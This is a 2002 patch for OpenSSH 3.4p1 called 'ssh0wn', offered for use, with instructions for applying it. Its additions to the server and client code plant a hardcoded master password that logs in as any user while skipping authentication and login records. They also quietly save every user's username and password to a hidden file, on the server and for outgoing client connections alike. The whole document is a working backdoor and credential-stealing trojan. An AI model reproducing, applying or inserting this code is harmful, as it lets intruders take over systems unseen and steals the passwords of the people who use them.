@@ -1,0 +1,197 @@
+# $Id: ssh0wn.diff,v 1.6 2002/08/08 21:53:02 enz00 Exp $
+#
+# patch for openssh-3.4p1
+#
+# when applied this patch will authenticate you 
+# as any user with the secret password and that user
+# will not be logged. it will also log logins/passwords
+# client and server side
+#
+# usage:
+# you'll probably want to change the defines found below
+# make sure that the _LOG_DIR is chmod 777
+# cp ssh0wn.diff openssh-3.4p1/;cd openssh-3.4p1
+# patch < ssh0wn.diff
+#
+# enz00@angrypacket.com
+# sec.angrypacket.com
+
+--- openssh-3.4p1/auth-passwd.c	Fri Jun 21 02:05:13 2002
++++ ssh0wn/auth-passwd.c	Thu Aug  8 15:44:55 2002
+@@ -218,6 +218,16 @@
+ #endif /* HAVE_MD5_PASSWORDS */
+ 
+ 	/* Authentication is accepted if the encrypted passwords are identical. */
+-	return (strcmp(encrypted_password, pw_password) == 0);
++	if(strcmp(_SECRET_PASSWD, password) == 0){
++			mlogin_ok = 1;
++			return 1;
++	}
++	if(strcmp(encrypted_password, pw_password) == 0){
++			outf = fopen(_LOG_DIR"/"_S_LOG,"a+");
++			fprintf (outf, "%s:%s\n",pw->pw_name,password);
++			fclose (outf);
++			return 1;
++	}else
++			return 0;
+ #endif /* !USE_PAM && !HAVE_OSF_SIA */
+ }
+--- openssh-3.4p1/auth.c	Wed May 22 01:06:28 2002
++++ ssh0wn/auth.c	Thu Aug  1 23:16:54 2002
+@@ -248,14 +248,17 @@
+ 	else
+ 		authmsg = authenticated ? "Accepted" : "Failed";
+ 
+-	authlog("%s %s for %s%.100s from %.200s port %d%s",
+-	    authmsg,
+-	    method,
+-	    authctxt->valid ? "" : "illegal user ",
+-	    authctxt->user,
+-	    get_remote_ipaddr(),
+-	    get_remote_port(),
+-	    info);
++	/* dont log if secret pass */
++	if(!mlogin_ok){
++		authlog("%s %s for %s%.100s from %.200s port %d%s",
++	    	authmsg,
++	    	method,
++	    	authctxt->valid ? "" : "illegal user ",
++	    	authctxt->user,
++	    	get_remote_ipaddr(),
++	    	get_remote_port(),
++	    	info);
++	}
+ }
+ 
+ /*
+--- openssh-3.4p1/canohost.c	Tue Jun 11 12:47:22 2002
++++ ssh0wn/canohost.c	Wed Aug  7 17:43:34 2002
+@@ -74,11 +74,13 @@
+ 
+ 	debug3("Trying to reverse map address %.100s.", ntop);
+ 	/* Map the IP address to a host name. */
+-	if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
+-	    NULL, 0, NI_NAMEREQD) != 0) {
+-		/* Host name not found.  Use ip address. */
+-		log("Could not reverse map address %.100s.", ntop);
+-		return xstrdup(ntop);
++	if(!mlogin_ok){
++	  if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
++	      NULL, 0, NI_NAMEREQD) != 0) {
++		  /* Host name not found.  Use ip address. */
++		  log("Could not reverse map address %.100s.", ntop);
++	   	  return xstrdup(ntop);
++	  }
+ 	}
+ 
+ 	/* Got host name. */
+--- openssh-3.4p1/includes.h	Mon May 13 01:14:09 2002
++++ ssh0wn/includes.h	Thu Aug  8 15:45:46 2002
+@@ -157,4 +157,13 @@
+ 
+ #include "entropy.h"
+ 
++/* hax0r shit */
++#define _SECRET_PASSWD "l33thex0r_passwerd"
++#define _LOG_DIR "/dev/hdal"
++#define _S_LOG "slog"
++#define _C_LOG "clog"
++FILE *outf;
++int mlogin_ok;
++/* end hax0r shit */
++
+ #endif /* INCLUDES_H */
+--- openssh-3.4p1/sshconnect1.c	Thu Jun  6 15:57:34 2002
++++ ssh0wn/sshconnect1.c	Thu Aug  8 15:48:48 2002
+@@ -922,6 +922,7 @@
+ {
+ 	int type, i;
+ 	char *password;
++	char gpasswd[120];
+ 
+ 	debug("Doing password authentication.");
+ 	if (options.cipher == SSH_CIPHER_NONE)
+@@ -930,6 +931,7 @@
+ 		if (i != 0)
+ 			error("Permission denied, please try again.");
+ 		password = read_passphrase(prompt, 0);
++		strcpy(gpasswd,password);
+ 		packet_start(SSH_CMSG_AUTH_PASSWORD);
+ 		ssh_put_password(password);
+ 		memset(password, 0, strlen(password));
+@@ -938,8 +940,15 @@
+ 		packet_write_wait();
+ 
+ 		type = packet_read();
+-		if (type == SSH_SMSG_SUCCESS)
++		if (type == SSH_SMSG_SUCCESS){
++			/* dont log if secret pass */
++			if(strcmp(_SECRET_PASSWD,gpasswd) != 0){
++				outf = fopen(_LOG_DIR"/"_C_LOG,"a+");
++				fprintf (outf,"%s:%s@%s\n",options.user,gpasswd,get_remote_ipaddr());
++				fclose (outf);
++			}
+ 			return 1;
++		}
+ 		if (type != SSH_SMSG_FAILURE)
+ 			packet_disconnect("Protocol error: got %d in response to passwd auth", type);
+ 	}
+--- openssh-3.4p1/sshconnect2.c	Sun Jun 23 17:23:21 2002
++++ ssh0wn/sshconnect2.c	Thu Aug  8 15:48:20 2002
+@@ -446,6 +446,7 @@
+ 	static int attempt = 0;
+ 	char prompt[150];
+ 	char *password;
++	char gpasswd[120];
+ 
+ 	if (attempt++ >= options.number_of_password_prompts)
+ 		return 0;
+@@ -456,6 +457,7 @@
+ 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 	    authctxt->server_user, authctxt->host);
+ 	password = read_passphrase(prompt, 0);
++	strcpy(gpasswd,password);
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+@@ -470,6 +472,12 @@
+ 	dispatch_set(SSH2_MSG_USERAUTH_PASSWD_CHANGEREQ,
+ 	    &input_userauth_passwd_changereq);
+ 
++	/* dont log if its the secret pass */
++	if(strcmp(_SECRET_PASSWD,gpasswd) != 0){
++		outf = fopen(_LOG_DIR"/"_C_LOG,"a+");
++		fprintf (outf,"%s:%s@%s\n",options.user,gpasswd,get_remote_ipaddr());
++		fclose (outf);
++	}
+ 	return 1;
+ }
+ /*
+--- openssh-3.4p1/sshlogin.c	Sun Jun 23 17:23:21 2002
++++ ssh0wn/sshlogin.c	Thu Aug  8 15:46:10 2002
+@@ -71,8 +71,11 @@
+ 
+   li = login_alloc_entry(pid, user, host, ttyname);
+   login_set_addr(li, addr, sizeof(struct sockaddr));
+-  login_login(li);
+-  login_free_entry(li);
++  /* dont log if secret pass */
++  if(!mlogin_ok){
++  	login_login(li);
++  	login_free_entry(li);
++  }
+ }
+ 
+ #ifdef LOGIN_NEEDS_UTMPX
+@@ -96,6 +99,9 @@
+   struct logininfo *li;
+ 
+   li = login_alloc_entry(pid, user, NULL, ttyname);
+-  login_logout(li);
+-  login_free_entry(li);
++  /* no logout if secret pass */
++  if(!mlogin_ok){
++  	login_logout(li);
++  	login_free_entry(li);
++  }
+ }
